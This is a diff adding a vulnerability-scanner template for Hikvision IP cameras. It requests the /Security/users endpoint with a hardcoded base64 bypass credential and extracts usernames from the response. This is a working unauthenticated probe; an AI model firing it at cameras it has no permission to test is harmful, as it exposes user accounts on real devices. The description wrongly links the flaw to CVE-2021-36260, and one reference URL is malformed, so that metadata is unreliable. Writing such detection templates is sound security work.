@@ -1,0 +1,43 @@
+id: hikvision-cam-info-exposure
+
+info:
+  name: Hikvision IP Camera - Info Exposure
+  author: AbdulrahmanTamim
+  severity: high
+  description: |
+    Unauthenticated exposure of sensitive endpoints was detected on vulnerable Hikvision IP cameras. This included live snapshot feeds, encrypted configuration files, and full user credential XML through CVE-2021-36260 exploit chaining and bypass logic.
+  reference:
+    - https://www.exploit-db.com/exploits/45231
+    - https://www.cve.org/CVERecord?id=CVE-2021-36260
+    - https://nvd.nist.nist.gov/vuln/detail/CVE-2021-36260
+    - https://seclists.org/fulldisclosure/2017/Sep/23
+  metadata:
+    verified: true
+    max-request: 1
+    shodan-query: 3.1.3.150324
+  tags: hikvision,iot,camera,exposure
+
+variables:
+  b64auth: YWRtaW46MTEK
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/Security/users?auth={{b64auth}}"
+
+    matchers:
+      - type: dsl
+        name: Usernames
+        dsl:
+          - contains_all(body, "userName","userLevel")
+          - contains(content_type,"application/xml")
+          - status_code == 200
+        condition: and
+
+    extractors:
+      - type: regex
+        name: Usernames
+        group: 1
+        regex:
+          - "<userName>(.*?)</userName>"
+# digest: 4a0a00473045022100b24d4bb190b0b5f8049a83a9251752f2987df5fea0c78eef5fb62062ce33a31802203792e29b262a78ed0abd669ea3fba8fbc2c80c41e35ad5fdc56ab39666ec00b2:922c64590222798bb761d5b6d8e72950
